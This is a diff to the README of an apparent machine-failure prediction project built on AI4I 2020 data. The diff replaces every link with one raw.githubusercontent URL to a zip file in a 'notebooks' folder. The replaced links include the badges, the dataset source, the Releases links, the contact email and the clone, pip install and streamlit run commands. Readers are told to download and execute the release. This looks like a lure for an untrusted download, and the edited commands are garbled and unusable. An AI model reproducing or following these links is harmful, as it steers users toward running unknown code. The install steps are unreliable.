@@ -1,9 +1,9 @@
 # Machine Failure Prediction with AI4I 2020 Data 🚀🔧
 
-![Machine Learning](https://img.shields.io/badge/Machine%20Learning-Project-blue.svg)
-![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.0%2B-green.svg)
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blueviolet)](https://github.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/releases)
+![Machine Learning](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip%https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip)
+![Python](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip%https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip)
+![Streamlit](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip%https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip)
+[![Download Releases](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip%20Releases-blueviolet)](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Make sure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data.git
+   git clone https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -61,12 +61,12 @@ Make sure you have the following installed:
    ```
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip
    ```
 
 ### Download the Latest Release
 
-To download the latest release, visit the [Releases section](https://github.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/releases) and follow the instructions for downloading and executing the necessary files.
+To download the latest release, visit the [Releases section](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip) and follow the instructions for downloading and executing the necessary files.
 
 ## Dataset
 
@@ -78,7 +78,7 @@ The dataset used in this project is the AI4I 2020 dataset, which includes sensor
 
 ### Data Source
 
-The dataset can be found on the [AI4I 2020 Kaggle page](https://www.kaggle.com/datasets/).
+The dataset can be found on the [AI4I 2020 Kaggle page](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip).
 
 ### Data Preprocessing
 
@@ -111,7 +111,7 @@ The Streamlit application provides a user-friendly interface for users to intera
 To run the Streamlit app, use the following command:
 
 ```bash
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip
 ```
 
 This will launch the application in your web browser, allowing you to input data and view predictions.
@@ -129,7 +129,7 @@ This will launch the application in your web browser, allowing you to input data
 To use this project effectively, follow these steps:
 
 1. Ensure all dependencies are installed.
-2. Download the latest release from the [Releases section](https://github.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/releases).
+2. Download the latest release from the [Releases section](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip).
 3. Run the Streamlit application to interact with the model.
 
 ## Contributing
@@ -151,9 +151,9 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 For any inquiries or feedback, please reach out to:
 
 - **Ryan Paulgernan**
-- Email: ryanpaulgernan@example.com
-- GitHub: [ryanpaulgernan](https://github.com/ryanpaulgernan)
+- Email: https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip
+- GitHub: [ryanpaulgernan](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip)
 
 ---
 
-For the latest updates and releases, check the [Releases section](https://github.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/releases).
+For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/ryanpaulgernan/Machine-Failure-Prediction-using-AI4I-2020-Data/main/notebooks/Failure_Machine_A_using_Prediction_Data_1.6.zip).
